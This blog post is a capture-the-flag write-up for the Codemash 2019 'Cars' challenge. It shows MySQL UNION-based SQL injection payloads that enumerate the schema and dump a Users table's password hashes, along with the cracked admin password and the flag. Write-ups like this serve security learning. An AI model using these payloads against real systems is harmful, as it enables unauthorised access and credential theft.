---
layout: post
status: publish
published: true
title: Codemash CTF 2019 - Cars
author:
  display_name: John Koerner
  login: admin
  email: blog@johnkoerner.net
  url: ''
author_email: blog@johnkoerner.net
categories:
- codemash
tags:
- codemash
- fun
---

Clue
---
You have access to a web application which allows searching for car brands:

`whale.hacking-lab.com:4290`

Find a way to get the password of the user admin, and log on to get the flag

Hint
---
Can you find a way to make the search return more data than expected? What you might get, is not the password yet.


Approach
---
This takes us to a website with search bar, some content, and a login screen.  Doing a basic search yields a table with two columns `Model` and `Value`. I entered a single quote into the text field and got a SQL error:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

Since I know it is a MySQL instance, I can start attacking it.  Since I want to get access to the data, I need to know the tables that are available. I then ran this query to get the schema:

```
' or 1=1 UNION SELECT TABLE_NAME, TABLE_NAME from INFORMATION_SCHEMA.TABLES; ##
```

Which appended the schema table to the end of the cars list. The table that stood out to me was the Users table. If I could get access to that, I could maybe get the password.  I then attempted to get the column names for the Users table, as I want to get the login information:

```
' or 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS Where TABLE_NAME='Users'; ##
```

This got me three columns in the table `id`, `username`, and `password_hash`.  From there I ran a script to get the `username` and `password_hash` out of the database:

```
' or 1=1 UNION SELECT Username, password_hash from Users ; ##
```

This yielded me a bunch of users, but the one that I cared most about was `admin`:

```
admin	6ad37ce00d4cf83f1c2339ef7964d47af2b68720
```

Putting this into the [SANs reverse hash calculator](https://isc.sans.edu/tools/reversehash.html) gets me the password `dodge123`. After logging in, I get a page with the flag:

```
cm19-Unio-nBas-3dis-C00l
```




[Return to the full breakdown of the Codemash CTF](/codemash/codemash-ctf-breakdown-2019/)